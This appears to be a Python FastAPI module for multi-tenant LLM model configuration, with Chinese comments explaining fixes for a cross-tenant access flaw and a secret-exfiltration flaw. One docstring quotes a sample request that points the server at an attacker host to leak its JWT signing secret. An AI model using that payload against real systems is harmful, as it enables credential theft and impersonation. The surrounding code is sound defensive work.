"""Model registry CRUD (Provider configs).

## 归属规则（本次修复的真实漏洞）

`models.company_id` 字段一直存在，但**创建时不写、查询时不用**：
任何注册用户都能列出、修改、测试、删除别人的模型配置——包括对方的
base_url 与"密钥放在哪个环境变量"这类信息。这是跨租户越权（IDOR），
在多租户部署下属于严重问题。

现在把归属真正接起来：

* 创建时写入 `company_id`（前端传当前激活公司）；为空表示"未归属/共享"。
* 列表只返回"自己公司的"与"未归属的"，未归属的在响应里标记 `unowned`。
* 改 / 删 / 测试都需要该公司具备对应能力（见 `core.permissions`）。
* 未归属的配置只允许被**认领**（PATCH 带上自己的 company_id），不能直接删：
  无主配置可能正被别家公司的员工使用，直接删会造成看不见的破坏。
"""
import logging

from fastapi import APIRouter, Depends, HTTPException, Query
from pydantic import BaseModel
from sqlalchemy import delete, or_, select
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.deps import get_current_user
from app.core.config import is_sensitive_env_name
from app.core.env_store import (PROVIDER_ENV_VARS, is_allowed_model_env,
                                mask_key, persist_env_key)
from app.core.net_guard import OutboundURLRejected, validate_outbound_url_async
from app.core.permissions import Capability, ensure_capability
from app.db.session import get_db
from app.model_gateway import PROVIDERS
from app.models.agent import Agent, AgentModelConfig, Model, ModelProviderType
from app.models.company import Company
from app.models.membership import CompanyMember
from app.models.user import User
from app.schemas.responses_ops import (
    ModelBatchImportOut,
    ModelBindAgentsOut,
    ModelConfigItemOut,
    ModelCreatedOut,
    ModelTestOut,
    ModelUpdatedOut,
    ModelsDiagnosticsOut,
    ProviderModelsListOut,
)

router = APIRouter(prefix="/models", tags=["models"])
logger = logging.getLogger(__name__)


# 模型配置里可能夹带的明文密钥字段名（历史上有人把 key 直接写进 config）。
# 返回值一律剔除；`*_env` 是"密钥变量名"这类引用，按契约保留。
_SECRET_CONFIG_KEYS = {"api_key", "apikey", "secret", "password", "authorization"}
_SECRET_SUFFIXES = ("_api_key", "_secret", "_password", "_token", "_key")


def _is_secret_config_key(name: str) -> bool:
    n = name.lower().replace("-", "_")
    if n.endswith("_env") or n.endswith("_env_var"):
        return False  # 只引用环境变量名，不是密钥本身
    return n in _SECRET_CONFIG_KEYS or n.endswith(_SECRET_SUFFIXES)


def _safe_config(config):
    """剔除 config 中的密钥类字段，避免列表接口把明文密钥回给前端。"""
    if isinstance(config, list):
        return [_safe_config(v) for v in config]
    if not isinstance(config, dict):
        return config
    return {k: _safe_config(v) for k, v in config.items()
            if not _is_secret_config_key(str(k))}


async def _my_company_ids(db: AsyncSession, user_id: str) -> list[str]:
    """调用者可见的公司 id：超管看全部；其余 = owner 事实源 ∪ active 成员行。

    与 tasks/tokens 的 `_accessible_company_ids` 同口径——P5 之后"是不是
    公司成员"由成员表表达，只看 `companies.owner_id` 会把 admin/member
    挡在自己的模型配置之外。
    """
    user = await db.get(User, user_id)
    if user is not None and user.is_superadmin:
        return [cid for (cid,) in (await db.execute(select(Company.id))).all()]
    owned = select(Company.id).join(
        User, User.id == Company.owner_id).where(User.id == user_id)
    member = select(CompanyMember.company_id).where(
        CompanyMember.user_id == user_id,
        CompanyMember.status == "active")
    rows = await db.execute(select(Company.id).where(
        or_(Company.id.in_(owned), Company.id.in_(member))))
    return [cid for (cid,) in rows.all()]


async def _ensure_model_access(db, user, m: Model, capability: Capability) -> None:
    """校验对某条模型配置的操作权限。

    未归属（company_id 为空）的配置不允许直接改删——见模块文档：
    它可能正被别人公司的员工使用，先认领再操作。
    """
    if m.company_id is None:
        raise HTTPException(
            409,
            "该模型配置未归属任何公司（多为升级前登记的遗留配置），"
            "不能直接修改或删除。请先认领：PATCH 时带上自己公司的 company_id。")
    await ensure_capability(db, user.id, m.company_id, capability)


# 模型配置里绝不允许引用的服务端敏感变量名（防「先落库、再调用/测试」外发）。
# 名单本身在 core.config，写入校验与运行时解析共用同一份，避免两处漂移。
def _reject_sensitive_env(name: str | None) -> None:
    if is_sensitive_env_name(name):
        raise HTTPException(
            400,
            "出于安全考虑，模型配置不能引用服务端敏感环境变量；"
            "请改用模型服务自己的密钥变量。")


async def _validate_model_base_url(base_url: str | None) -> None:
    if not base_url:
        return
    try:
        # 本地模型服务常监听私网，故 allow_private=True；元数据地址仍拒绝
        await validate_outbound_url_async(base_url, allow_private=True)
    except OutboundURLRejected as e:
        raise HTTPException(400, f"base_url 不安全：{e}")


def key_available(model_row: Model) -> bool:
    """该模型在**实际调用时**能否取到密钥。

    必须与 `model_gateway._resolve_api_key()` 使用同一套解析逻辑
    （`settings.resolved_api_key`）。否则自检与运行时会出现两种事实：
    自检说"缺密钥"、任务却能跑通；或者自检说"就绪"、任务 401 失败。
    """
    import os

    from app.core.config import settings

    provider = model_row.provider_type.value
    if settings.resolved_api_key(model_row.api_key_env, provider):
        return True
    # 兼容 <ENV>_FILE 形式的密钥文件注入
    env_name = model_row.api_key_env or PROVIDER_ENV_VARS.get(provider, "")
    return bool(env_name and os.environ.get(f"{env_name}_FILE", ""))


class EnvKeyIn(BaseModel):
    env_name: str
    api_key: str


# 有意**不**声明 response_model：返回体里的 `masked` 是密钥片段
# （`key[:4] + "…" + key[-4:]`），不是「密钥是否存在」的布尔值。把它写进
# 契约等于固化「接口回显密钥材料」，这一步需要先过安全评审（见 A3 报告）。
@router.post("/env-key")
async def save_env_key(data: EnvKeyIn, user: User = Depends(get_current_user)):
    """把模型密钥写进本机 .env 并立即生效。

    为什么需要：密钥过去只能手工编辑 apps/api/.env 再重启后端，
    对普通用户是天堑——于是新装的系统里每个员工都以"尚未绑定模型"
    收场。这里把这一步变成一次表单提交。

    安全边界：
    * 仅超管（安装者）可写——写 .env 是服务器级动作；
    * 变量名白名单（三个 provider 的默认变量），不能借它改写其它配置；
    * 密钥只存在本机 .env，不入库、不外发、不回显（响应里只有掩码）；
    * 文件权限 600，原子替换，写后同步 os.environ。
    """
    import re

    if not user.is_superadmin:
        raise HTTPException(403, "只有系统管理员可以写入服务端密钥。")

    env_name = (data.env_name or "").strip()
    if is_sensitive_env_name(env_name):
        raise HTTPException(
            400, "该变量名看起来像一个敏感配置（密钥/令牌等），不能通过此接口写入。")
    if not is_allowed_model_env(env_name):
        raise HTTPException(
            400,
            f"env_name 只允许 {sorted(set(PROVIDER_ENV_VARS.values()))} "
            "或服务端生成的自定义供应商变量（AIEOS_PROVIDER_*_API_KEY），"
            "不能写入其它变量。")

    key = data.api_key or ""
    if not 8 <= len(key) <= 512:
        raise HTTPException(400, "密钥长度应在 8–512 个字符之间。")
    if re.search(r"[\s\"'`\\]", key):
        raise HTTPException(400, "密钥里不能包含空白字符或引号，请检查是否多复制了内容。")

    try:
        persist_env_key(env_name, key)
    except OSError as e:
        raise HTTPException(
            500, f"写入 .env 失败：{e.strerror or e}。请确认后端目录有写权限。")

    return {"saved": True, "env_name": env_name, "masked": mask_key(key),
            "applied": True}


class ModelIn(BaseModel):
    name: str
    provider_type: str  # openai_compat|anthropic|gemini
    base_url: str | None = None
    api_key_env: str | None = None
    model_id: str
    config: dict | None = {}
    # 归属公司。不传则登记为"未归属/共享"（本地单人使用时够用）。
    company_id: str | None = None


def _test_failed(model_row: Model) -> bool:
    """连通性测试是否**明确失败**。没有测过（缺字段）不算失败。"""
    return (model_row.config or {}).get("last_test_ok") is False


def _last_test_at(model_row: Model) -> str | None:
    value = (model_row.config or {}).get("last_test_at")
    return value if isinstance(value, str) else None


def _record_test_result(m: Model, ok: bool, error: str | None) -> None:
    """把测试结果写回 Model.config，供 diagnostics 判断"能不能开工"。

    只存布尔 / 时间 / 截断后的原因：错误原文里可能回显 base_url 甚至密钥片段，
    不整段落库。
    """
    from datetime import datetime, timezone

    config = dict(m.config or {})
    config["last_test_ok"] = bool(ok)
    config["last_test_at"] = datetime.now(timezone.utc).isoformat()
    config["last_test_error"] = (str(error)[:200] if error else None)
    # JSON 列不会原地感知可变对象，必须整体重新赋值
    m.config = config


@router.get("/diagnostics", response_model=ModelsDiagnosticsOut)
async def diagnostics(db: AsyncSession = Depends(get_db),
                      user: User = Depends(get_current_user)):
    """模型配置就绪自检。

    ## 为什么需要

    改造前的冷启动断链：新建公司 → 系统里**没有任何 Model 记录** →
    老板下达任务 → 运行时找不到可用模型 → 任务失败。
    而前端没有任何地方提示"你还缺一步：配置模型和密钥"。

    本接口让前端能明确告诉用户卡在哪一步。安全约束：
    **只报告密钥是否存在（布尔），绝不返回密钥内容本身**。
    """
    all_rows = list((await db.execute(select(Model).where(
        or_(Model.company_id.is_(None),
            Model.company_id.in_(await _my_company_ids(db, user.id)))))).scalars())
    # 停用的模型不参与"能否开工"的判断：界面上关掉一个坏模型，
    # 自检就不应继续因为它的失败把人拦在门外。
    rows = [m for m in all_rows if m.enabled is not False]
    providers = []
    for ptype, env_name in PROVIDER_ENV_VARS.items():
        configured = [m for m in rows
                      if m.provider_type.value == ptype]
        key_ready = [m for m in configured if key_available(m)]
        ready_of_type = [m for m in key_ready if not _test_failed(m)]
        tested_at = [t for t in (_last_test_at(m) for m in configured) if t]
        providers.append({
            "provider_type": ptype,
            "default_env_var": env_name,
            # 该 provider 下"至少有一个模型能取到密钥"即为就绪。
            # 只看默认环境变量会误报：用户在模型配置里填了自定义变量名
            # （api_key_env）时，系统其实可用，界面却显示"缺密钥"。
            "key_present": bool(key_ready),
            # models_ready 只数"密钥就位且连通性测试没失败"的模型：
            # 测过但失败 = 已知不可用，不能再算就绪
            "models_ready": len(ready_of_type),
            "model_count": len(configured),
            "last_test_ok": (True if any(not _test_failed(m) for m in key_ready)
                             else False if key_ready else None),
            "last_test_at": max(tested_at) if tested_at else None,
        })

    # 是否存在"至少一个模型 + 该模型的密钥已就位"的组合
    ready_models = [m.id for m in rows if key_available(m) and not _test_failed(m)]
    # 密钥有、但连通性测试明确失败：这不是"缺配置"，是"配了但不通"，
    # 提示必须区分开，否则用户会去反复重填一个本来正确的密钥。
    connectivity_failed = [m for m in rows
                           if key_available(m) and _test_failed(m)]

    missing_hint = ""
    if not all_rows:
        missing_hint = "还没有配置任何模型。请先添加供应商，再拉取并启用模型。"
    elif not rows:
        missing_hint = "所有模型都已停用。请在模型配置中至少启用一个模型。"
    elif not ready_models:
        if connectivity_failed:
            err = (connectivity_failed[0].config or {}).get("last_test_error") or ""
            missing_hint = ("模型连通性测试失败"
                            + (f"：{err}" if err else "")
                            + "。请检查 base_url、密钥与网络后重新测试。")
        else:
            names = "、".join(
                sorted({m.api_key_env or PROVIDER_ENV_VARS.get(m.provider_type.value, "")
                        for m in rows} - {""}))
            missing_hint = (f"模型已登记但缺少密钥。请在「模型配置」页填写 API Key"
                            f"（保存为 {names}，立即生效，无需重启后端）。")

    return {
        "model_count": len(rows),
        "usable_model_ids": ready_models,
        "ready": bool(ready_models),
        "providers": providers,
        "hint": missing_hint,
    }


@router.get("", response_model=list[ModelConfigItemOut])
async def list_models(company_id: str | None = Query(None),
                      db: AsyncSession = Depends(get_db),
                      user=Depends(get_current_user)):
    """列出当前用户可见的模型配置。

    可见 = "自己公司的" 或 "未归属的（升级前遗留）"。
    改造前这里返回**全表**：任何注册用户都能看到别人的 provider 配置。
    """
    mine = await _my_company_ids(db, user.id)
    if company_id:
        # 指定公司时必须真的有权限，否则等于借参数绕过隔离
        await ensure_capability(db, user.id, company_id, Capability.VIEW)
        mine = [company_id]
    q = await db.execute(select(Model).where(
        or_(Model.company_id.is_(None), Model.company_id.in_(mine))))
    rows = list(q.scalars())
    from app.models.model_provider import ModelProvider

    provider_ids = {m.provider_id for m in rows if m.provider_id}
    names: dict[str, str] = {}
    if provider_ids:
        names = {p.id: p.name for p in (await db.execute(
            select(ModelProvider).where(ModelProvider.id.in_(provider_ids))
        )).scalars()}
    return [
        {"id": m.id, "name": m.name, "provider_type": m.provider_type.value,
         "base_url": m.base_url, "model_id": m.model_id,
         "config": _safe_config(m.config),
         "company_id": m.company_id,
         # 未归属的配置要显式标出来，前端才能提示去认领，
         # 否则用户只会疑惑"为什么这条我删不掉"。
         "unowned": m.company_id is None,
         "provider_id": m.provider_id,
         "provider_name": names.get(m.provider_id or ""),
         "model_type": m.model_type or "text",
         "multimodal": bool(m.multimodal),
         "capabilities": m.capabilities or [],
         "enabled": m.enabled is not False,
         "config_source": m.config_source or "default",
         "last_synced_at": (m.last_synced_at.isoformat()
                            if m.last_synced_at else None)}
        for m in rows
    ]


@router.post("", status_code=201, response_model=ModelCreatedOut)
async def create_model(data: ModelIn, db: AsyncSession = Depends(get_db),
                       user=Depends(get_current_user)):
    try:
        pt = ModelProviderType(data.provider_type)
    except ValueError:
        raise HTTPException(400, f"provider_type must be one of {list(PROVIDERS)}")
    if data.company_id:
        # 只能登记到自己有管理权的公司名下
        await ensure_capability(db, user.id, data.company_id, Capability.MANAGE)
    _reject_sensitive_env(data.api_key_env)
    await _validate_model_base_url(data.base_url)
    payload = data.model_dump()
    payload.pop("provider_type", None)
    if not (payload.get("api_key_env") or "").strip():
        # 没指定变量名时落 provider 默认变量：模型行自解释，
        # 也避免"密钥明明写在 .env 里、却没有任何行指向它"的静默 401。
        payload["api_key_env"] = PROVIDER_ENV_VARS.get(pt.value)
    m = Model(**payload, provider_type=pt)
    db.add(m)
    await db.commit()
    await db.refresh(m)
    return {"id": m.id, "name": m.name, "provider_type": m.provider_type.value,
            "company_id": m.company_id}


# exclude_unset：`claimed` 只在「认领未归属配置」那一支出现。
@router.patch("/{mid}", response_model=ModelUpdatedOut,
              response_model_exclude_unset=True)
async def update_model(mid: str, data: dict, db: AsyncSession = Depends(get_db),
                       user=Depends(get_current_user)):
    """修改模型配置。未归属的配置只允许被「认领」（补上 company_id）。"""
    m = await db.get(Model, mid)
    if not m:
        raise HTTPException(404, "Model not found")

    claim_to = data.get("company_id")
    if m.company_id is None:
        # 未归属：唯一允许的改动是认领。认领后归属明确，可正常管理。
        if not claim_to:
            raise HTTPException(
                409,
                "该模型配置未归属任何公司（多为升级前登记的遗留配置）。"
                '请先认领：提交 {"company_id": "<你的公司 id>"}。')
        await ensure_capability(db, user.id, claim_to, Capability.MANAGE)
        m.company_id = claim_to
        await db.commit()
        return {"id": m.id, "name": m.name, "company_id": m.company_id,
                "claimed": True}

    await _ensure_model_access(db, user, m, Capability.MANAGE)
    if claim_to and claim_to != m.company_id:
        # 转让归属要求两边都有权限，否则等于"把别人的模型搬到我家"
        await ensure_capability(db, user.id, claim_to, Capability.MANAGE)
        m.company_id = claim_to

    # 类型改了或显式要求重置时，按新类型重新生成系统默认配置。
    # 否则界面上把「图片模型」改成「文本模型」后，仍留着一堆尺寸参数，
    # 看起来配过了、实际完全对不上。
    reset_config = bool(data.pop("reset_config", False))
    old_type = m.model_type
    new_type = data.get("model_type", old_type)
    reset_needed = reset_config or (
        "model_type" in data and new_type != old_type and "config" not in data)

    allowed = {"name", "base_url", "api_key_env", "model_id", "config",
               "model_type", "multimodal", "capabilities", "enabled",
               "provider_id", "config_source", "upstream_meta"}
    if "provider_type" in data:
        try:
            m.provider_type = ModelProviderType(data["provider_type"])
        except ValueError:
            raise HTTPException(400, f"未知的供应商类型：{data['provider_type']}")
    if "api_key_env" in data:
        _reject_sensitive_env(data["api_key_env"])
        if not (data["api_key_env"] or "").strip():
            # 和 POST 一致：清空变量名时落 provider 默认变量，
            # 而不是留下一行"取不到任何密钥"的空指向。
            data["api_key_env"] = PROVIDER_ENV_VARS.get(
                ModelProviderType(data.get("provider_type", m.provider_type.value)).value)
    if "base_url" in data:
        await _validate_model_base_url(data["base_url"])
    if "provider_id" in data and data["provider_id"]:
        from app.models.model_provider import ModelProvider

        provider = await db.get(ModelProvider, data["provider_id"])
        if provider is None:
            raise HTTPException(404, "供应商不存在")
        # 只能把模型挂到自己公司的供应商下，防止借参数跨租户搬运
        if provider.company_id is None:
            raise HTTPException(409, "该供应商未归属公司，请先认领。")
        await ensure_capability(db, user.id, provider.company_id, Capability.MANAGE)
        if m.company_id and provider.company_id != m.company_id:
            raise HTTPException(409, "不能把模型挂到别家公司的供应商下。")
    if "model_type" in data:
        from app.models.agent import ModelType

        try:
            ModelType(str(data["model_type"]))
        except ValueError:
            raise HTTPException(
                400, f"model_type 只能是 {[t.value for t in ModelType]}")
    if "config" in data and "config_source" not in data:
        # 手工改过配置就标 manual：界面上要能区分"上游来的"与"我改的"，
        # 否则下次同步会把人工修正静默盖掉而没有提示。
        m.config_source = "manual"
    if "provider_id" in data and not data["provider_id"]:
        # 空串落库会变成悬空引用（等同 NULL 的语义），直接归一为 None。
        data["provider_id"] = None
    for k, v in data.items():
        if k in allowed:
            setattr(m, k, v)

    if reset_needed:
        from app.model_discovery import default_config_for

        upstream = m.upstream_meta if isinstance(m.upstream_meta, dict) else {}
        m.config = default_config_for(
            str(m.model_type or "text"),
            {"context_window": upstream.get("context_window"),
             "max_output_tokens": upstream.get("max_output_tokens")},
            m.model_id)
        m.config_source = "auto"

    await db.commit()
    return {"id": m.id, "name": m.name, "company_id": m.company_id}


@router.delete("/{mid}", status_code=204)
async def delete_model(mid: str, db: AsyncSession = Depends(get_db),
                       user=Depends(get_current_user)):
    m = await db.get(Model, mid)
    if not m:
        raise HTTPException(404, "Model not found")
    # 模型密钥属于公司级配置：删除只需 MANAGE（与 tokens/artifacts 的
    # 配置类删除同口径），不升级到 DESTRUCTIVE 把公司管理员排除在外。
    await _ensure_model_access(db, user, m, Capability.MANAGE)
    # 先解绑再删：agent_model_configs.model_id 有外键约束，直接删模型会
    # 500。绑定这里只是一行记录，删掉后员工回到"未绑定"，不丢任何历史。
    unbound = await db.execute(delete(AgentModelConfig).where(
        AgentModelConfig.model_id == m.id))
    if unbound.rowcount:
        logger.info("删除模型 %s：同时解除 %s 条员工绑定",
                    m.id, unbound.rowcount)
    await db.delete(m)
    await db.commit()


# exclude_unset：成功支（reply/raw_model）与失败支（error）互斥。
# 备注：失败支的 error 是上游异常原文截断 500，实测不含密钥，但含 base_url
# 一类的上游信息——这是这个端点既有的行为，本轮没有改动它。
@router.post("/{mid}/test", response_model=ModelTestOut,
             response_model_exclude_unset=True)
async def test_model(mid: str, db: AsyncSession = Depends(get_db),
                     user=Depends(get_current_user)):
    """Ping the provider with a tiny prompt."""
    from app.model_gateway import _resolve_api_key, PROVIDERS
    m = await db.get(Model, mid)
    if not m:
        raise HTTPException(404, "Model not found")
    # 未归属的配置属于共享资源，允许测试；有主的要求可见权限
    if m.company_id is not None:
        await ensure_capability(db, user.id, m.company_id, Capability.VIEW)

    # 防「先落库再测试」绕过：test_model 会把密钥发到 base_url，
    # 因此这里必须与 list-models 同口径——拒绝服务端敏感变量名，
    # 并拒绝云元数据地址（本地模型服务允许私网）。
    _reject_sensitive_env(m.api_key_env)
    await _validate_model_base_url(m.base_url)

    provider = PROVIDERS[m.provider_type](
        base_url=m.base_url or "", api_key=_resolve_api_key(m), model_id=m.model_id)
    try:
        # 64 而不是 10：推理型模型（如 agnes-2.5-flash）会先用 token 写
        # reasoning_content，上限太小会导致 content 为空——测试显示"连通正常"
        # 却看不到回复，用户会误以为模型坏了。
        result = await provider.chat([{"role": "user", "content": "回复 OK 两个字母即可"}],
                                     config={"max_tokens": 64})
    except Exception as e:
        # 结果必须落库：只返回给当前这一次请求，diagnostics 仍然认为
        # "有模型有密钥 = 就绪"，用户重启后又会掉进同一个坑。
        _record_test_result(m, False, f"{type(e).__name__}: {e}")
        await db.commit()
        return {"status": "error", "error": str(e)[:500]}
    _record_test_result(m, True, None)
    await db.commit()
    return {"status": "ok", "reply": result["content"][:100], "raw_model": result.get("raw_model")}


class BindAgentsIn(BaseModel):
    company_id: str
    role: str = "primary"          # primary|secondary|fallback
    only_unbound: bool = True      # True：只补“还没有该角色绑定”的员工，不动手工配过的


@router.post("/{mid}/bind-agents", response_model=ModelBindAgentsOut)
async def bind_model_to_agents(mid: str, data: BindAgentsIn,
                               db: AsyncSession = Depends(get_db),
                               user=Depends(get_current_user)):
    """把一条模型配置批量绑定给公司内全部 AI 员工。

    为什么需要：新装完成时公司里有几十名员工、0 条绑定，逐个员工点
    "设为首选模型"不现实；而运行时只认 `agent_model_configs`。没有这个
    接口，安装向导再顺，最后一步仍会以"尚未绑定任何模型"收场。
    """
    if data.role not in {"primary", "secondary", "fallback"}:
        raise HTTPException(400, "role 只能是 primary / secondary / fallback。")

    m = await db.get(Model, mid)
    if not m:
        raise HTTPException(404, "Model not found")
    # 先校验对目标公司的管理权：无权限时统一 404，不泄露"该模型属于谁"
    await ensure_capability(db, user.id, data.company_id, Capability.MANAGE)
    if m.company_id is None:
        raise HTTPException(
            409, "该模型配置未归属公司，请先认领（PATCH 带上 company_id）再绑定。")
    if m.company_id != data.company_id:
        raise HTTPException(409, "该模型不属于指定的公司，不能跨公司绑定。")
    from app.model_discovery import chat_model_rejection, is_chat_model
    if not is_chat_model(m.model_type):
        raise HTTPException(400, chat_model_rejection(m))

    agent_ids = [aid for (aid,) in (await db.execute(
        select(Agent.id).where(Agent.company_id == data.company_id))).all()]
    if not agent_ids:
        return {"model_id": m.id, "role": data.role, "agent_count": 0,
                "bound": 0, "skipped": 0}

    rows = (await db.execute(select(AgentModelConfig).where(
        AgentModelConfig.agent_id.in_(agent_ids),
        AgentModelConfig.role == data.role))).scalars().all()
    by_agent = {b.agent_id: b for b in rows}

    bound = 0
    for aid in agent_ids:
        existing = by_agent.get(aid)
        if existing is not None:
            if data.only_unbound:
                continue
            existing.model_id = m.id
        else:
            db.add(AgentModelConfig(agent_id=aid, role=data.role, model_id=m.id))
        bound += 1

    await db.commit()
    return {"model_id": m.id, "role": data.role,
            "agent_count": len(agent_ids), "bound": bound,
            "skipped": len(agent_ids) - bound}


class FetchModelsIn(BaseModel):
    base_url: str
    api_key: str | None = None      # 直接传 key（不落库）
    # 决定鉴权头：Anthropic 用 x-api-key，其余按 OpenAI 兼容用 Bearer。
    provider_type: str = "openai_compat"
    # 仅为识别旧客户端而保留：服务端**不再**读取任何环境变量，
    # 传了就 400（见 list_provider_models）。绝不能删掉字段只靠 Pydantic
    # 忽略未知字段，否则旧客户端会以为生效了。
    api_key_env: str | None = None


# exclude_unset：ok 支（base_url/models）与 error 支（error）互斥。
@router.post("/providers/list-models", response_model=ProviderModelsListOut,
             response_model_exclude_unset=True)
async def list_provider_models(data: FetchModelsIn,
                               user=Depends(get_current_user)):
    """从供应商拉取可用模型列表（OpenAI 兼容 GET /v1/models）。

    ## 安全边界（修复「密钥外发」）

    改造前本接口允许调用方指定 `api_key_env`，服务端会把该环境变量的值
    当作 `Authorization: Bearer` 发到调用方指定的 `base_url`。于是
    `{"base_url":"https://attacker.tld","api_key_env":"JWT_SECRET"}` 就能
    窃取 JWT 签名密钥并伪造任意用户。

    现在的规则：
    * `api_key_env` 一律拒绝（400）——密钥只能在服务端配置，不接受变量名。
    * `base_url` 过出站闸门（`allow_private=True`：本地模型服务常监听私网，
      但云元数据地址仍拒绝）。
    * 错误响应只回状态码/简短原因，**不回显上游响应体**。
    """
    from app.model_discovery import discover_models

    if data.api_key_env is not None:
        raise HTTPException(
            400,
            "出于安全考虑，不再支持通过 api_key_env 从环境变量读取密钥；"
            "请在服务端配置模型密钥后重试。")

    try:
        provider_type = ModelProviderType(data.provider_type)
    except ValueError:
        raise HTTPException(400, f"provider_type must be one of {[p.value for p in ModelProviderType]}")

    try:
        result = await discover_models(
            provider_type, data.base_url, data.api_key or "", allow_private=True)
    except OutboundURLRejected as e:
        raise HTTPException(400, f"base_url 不安全：{e}")
    if not result.ok:
        # 发现层已做到：不回显上游 body、不记录密钥
        return {"status": "error", "error": result.error or "拉取模型失败"}
    # `models` 保持裸 id 列表（旧客户端契约）；`items` 是新前端的完整信息：
    # 类型、多模态、能力与按类型生成的默认配置。
    return {"status": "ok", "base_url": data.base_url,
            "models": sorted(m["id"] for m in result.models),
            "items": result.models}


class BatchSelectIn(BaseModel):
    name_prefix: str          # 配置显示名前缀，如 "Hermes本地"
    provider_type: str = "openai_compat"
    base_url: str
    api_key_env: str | None = None
    model_ids: list[str]      # 用户勾选要启用的模型 id 列表


@router.post("/providers/batch-import", response_model=ModelBatchImportOut)
async def batch_import_models(data: BatchSelectIn,
                              db: AsyncSession = Depends(get_db),
                              user=Depends(get_current_user)):
    """把勾选的模型批量注册为可用 Model 配置。"""
    try:
        pt = ModelProviderType(data.provider_type)
    except ValueError:
        raise HTTPException(400, f"provider_type must be one of {list(PROVIDERS)}")
    _reject_sensitive_env(data.api_key_env)
    await _validate_model_base_url(data.base_url)
    created, existed = [], []
    q = await db.execute(select(Model))
    existing = {(m.provider_type, m.model_id): m.name for m in q.scalars()}
    for mid in data.model_ids:
        key = (pt, mid)
        if key in existing:
            existed.append(mid)
            continue
        m = Model(company_id=None, name=f"{data.name_prefix}-{mid}",
                  provider_type=pt, base_url=data.base_url,
                  api_key_env=data.api_key_env, model_id=mid)
        db.add(m)
        created.append(mid)
    await db.commit()
    return {"imported": created, "imported_count": len(created),
            "skipped_existing": existed}


# 有意**不**声明 response_model：`convert_model_id` 的值来自 POST 进来的自由
# 配置（settings 没开 validate_assignment，任何 JSON 值都能存住并原样回显），
# 声明成 str 会把「用户存了个对象」从可用变成 500。
@router.get("/convert-config")
async def get_convert_config(user=Depends(get_current_user)):
    from app.core.config import settings
    return {"convert_model_id": getattr(settings, "doc_convert_model_id", "") or ""}


# 同上：返回的是用户自己 POST 进来的任意值的回显，不建模型。
@router.post("/convert-config")
async def set_convert_config(data: dict, user=Depends(get_current_user)):
    """设置专用文档转换大模型（低成本模型），用于上传资料→MD 转换。"""
    from app.core.config import settings
    settings.doc_convert_model_id = data.get("convert_model_id") or ""
    return {"ok": True, "convert_model_id": settings.doc_convert_model_id}
